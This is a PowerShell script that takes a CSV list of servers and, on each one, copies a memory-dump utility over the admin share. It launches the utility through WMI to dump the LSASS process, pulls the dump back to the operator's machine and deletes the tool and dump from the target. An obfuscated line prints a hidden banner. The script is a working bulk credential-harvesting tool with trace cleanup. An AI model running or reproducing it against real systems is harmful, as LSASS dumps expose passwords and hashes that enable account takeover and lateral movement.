function Run-WmiRemoteProcess {
    Param(
        [string]$computername=$env:COMPUTERNAME,
        [string]$cmd=$(Throw "You must enter the full path to the command which will create the process."),
        [int]$timeout = 0
    )
 
    Write-Host "Process to create on $computername is $cmd"
    [wmiclass]$wmi="\\$computername\root\cimv2:win32_process"
    # Exit if the object didn't get created
    if (!$wmi) {return}
 
    try{
    $remote=$wmi.Create($cmd)
    }
    catch{
        $_.Exception
    }
    $test =$remote.returnvalue
    if ($remote.returnvalue -eq 0) {
        Write-Host ("Successfully launched $cmd on $computername with a process id of " + $remote.processid)
    } else {
        Write-Host ("Failed to launch $cmd on $computername. ReturnValue is " + $remote.ReturnValue)
    }    
    return
}

# ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
# Function Name 'Read-OpenFileDialog' - Open an open File Dialog box
# ________________________________________________________________________
Function Read-OpenFileDialog([string]$InitialDirectory, [switch]$AllowMultiSelect) {      
    [System.Reflection.Assembly]::LoadWithPartialName("System.windows.forms") | Out-Null
    $openFileDialog = New-Object System.Windows.Forms.OpenFileDialog        
    $openFileDialog.ShowHelp = $True    # http://www.sapien.com/blog/2009/02/26/primalforms-file-dialog-hangs-on-windows-vista-sp1-with-net-30-35/
    $openFileDialog.initialDirectory = $initialDirectory
    $openFileDialog.filter = "csv files (*.csv)|*.csv|All files (*.*)| *.*"
    $openFileDialog.FilterIndex = 1
    $openFileDialog.ShowDialog() | Out-Null
    return $openFileDialog.filename
}

Function ListFile {	
    $fileOpen = Read-OpenFileDialog 
    if($fileOpen -ne '') {	
		$colComputers = Import-Csv $fileOpen
    }
    $colComputers
}

cls
Write-Host "================================================================================================"
Write-Host -object (("1*0½1*1½1*3½1*0½1*1½1*1½1*3½1*1½*1½1*2½1*3½1*1½1*1½1*1½1*9½1*10½1*11½1*11½1*10½1*12½1*1½1*13½1*14½1*15½1*1½1*12½1*14½1*16½1*13½1*15½1*1½1*17½1*18½1*19½1*19½1*16½1*13½1*1½1*20½1*21½1*22½1*0½1*1½1*1½0*1½1*5½1*1½1*7½1*1½1*1½1*1½1*1½1*1½1*1½1*1½1*23½1*18½1*27½1*24½1*18½1*15½1*25½1*15½1*26½1*8½1*28½1*29½1*18½1*16½1*11½1*6½1*30½1*10½1*29½1*0½1*6½1*5½1*1½1*8½1*1½1*7½1*6½1*1½1*0"-split "½")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99"-split "T")[$matches[2]])"*$matches[1]}})-separator ""

$scriptPath = split-path -parent $MyInvocation.MyCommand.Definition
$scriptFile = $MyInvocation.MyCommand.Definition
$launchDate = get-date -f "yyyyMMddHHmmss"
$logDirectoryPath = $scriptPath + "\" + $launchDate
$file = "$logDirectoryPath\lsass.dmp"

if(!(Test-Path $logDirectoryPath)) {
    New-Item $logDirectoryPath -type directory | Out-Null
}

$logFileName = "Log_" + $launchDate + ".log"
$logPathName = "$logDirectoryPath\$logFileName"

$colComputers = ListFile	
if(![string]::IsNullOrEmpty($colComputers)) {
    $computerCount = $colComputers.Count
    Write-Host "List of $computerCount computers to query"

    foreach ($strComputer in $colComputers){    
        $strComputer = $strComputer.ServerName  
        $operatingSystem = (Get-WmiObject Win32_OperatingSystem -ComputerName $strComputer).version
        $osArchitecture =  (Get-WmiObject Win32_OperatingSystem -ComputerName $strComputer).OSArchitecture  
        if($osArchitecture -like "64*") {            
            Copy-Item -Path "$scriptPath\ud\x64\userdump.exe" -Destination "\\$strComputer\c$\windows\temp\userdump.exe"
            Copy-Item -Path "$scriptPath\ud\x64\dbghelp.dll" -Destination "\\$strComputer\c$\windows\temp\dbghelp.dll"
        }
        else {
            Copy-Item -Path "$scriptPath\ud\x86\userdump.exe" -Destination "\\$strComputer\c$\windows\temp\userdump.exe"
            Copy-Item -Path "$scriptPath\ud\x86\dbghelp.dll" -Destination "\\$strComputer\c$\windows\temp\dbghelp.dll"
        }
        
        $dumpAProcessPath = "C:\Windows\temp\userdump.exe"
        Run-WmiRemoteProcess $strComputer "$dumpAProcessPath lsass.exe c:\windows\temp" | Wait-Process
        Start-Sleep -Seconds 15
        Copy-Item -Path "\\$strComputer\\c$\windows\temp\lsass.dmp" -Destination "$logDirectoryPath\$operatingSystem-$osArchitecture-$strComputer.dmp"
        Remove-Item -Force "\\$strComputer\c$\windows\temp\userdump.exe"
        Remove-Item -Force "\\$strComputer\c$\windows\temp\dbghelp.dll"
        Remove-Item -Force "\\$strComputer\c$\windows\temp\lsass.dmp"        
        Write-Progress -Activity "msdsc log created" -status "Running..." -id 1
    }
}